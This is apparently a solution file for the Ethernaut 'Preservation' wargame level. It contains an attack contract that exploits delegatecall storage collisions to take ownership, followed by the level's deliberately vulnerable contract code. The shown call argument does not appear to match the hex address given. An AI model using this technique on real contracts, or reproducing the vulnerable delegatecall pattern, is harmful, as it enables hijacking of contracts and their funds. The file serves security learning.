

// Solution


pragma solidity ^0.5.0;



contract PreservationAttack {

  address slot0;
  address slot1; 
  address ownerSlot;

  function setTime(uint addressAsUint) public {
    // Sets the owner
    // ownerSlot = address(addressAsUint);
    ownerSlot = msg.sender;
  }
}


// use the converted attack contract address and convert to uint: i.e uint(attackContractAddress)
contract kk{
    uint public ll = uint(0x2C0a9A825192C59bf68711f5496DA736c8aD80d0);
}
// Call the setFirstTime method on the original preservation contract which calls the setTime method from the attacking contract
// but sets the owner in slot2(my address/msg.sender) as the owner of the preservation contract.
// await contract.setFirstTime("25143206100540498")


// A


/* Preservation
Level completed!
Difficulty 8/10

This contract utilizes a library to store two different times for two different timezones. The constructor creates two instances of the library for each time to be stored.

The goal of this level is for you to claim ownership of the instance you are given.

  Things that might help

Look into Solidity's documentation on the delegatecall low level function, how it works, how it can be used to delegate operations to on-chain. libraries, and what implications it has on execution scope.
Understanding what it means for delegatecall to be context-preserving.
Understanding how storage variables are stored and accessed.
Understanding how casting works between different data types.
As the previous level, delegate mentions, the use of delegatecall to call libraries can be risky. This is particularly true for contract libraries that have their own state. This example demonstrates why the library keyword should be used for building libraries, as it prevents the libraries from storing and accessing state variables.

Sources */
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Preservation {

  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public {
    timeZone1Library = _timeZone1LibraryAddress; 
    timeZone2Library = _timeZone2LibraryAddress; 
    owner = msg.sender;
  }
 
  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
}

// Simple library contract to set the time
contract LibraryContract {

  // stores a timestamp 
  uint storedTime;  

  function setTime(uint _time) public {
    storedTime = _time;
  }
}
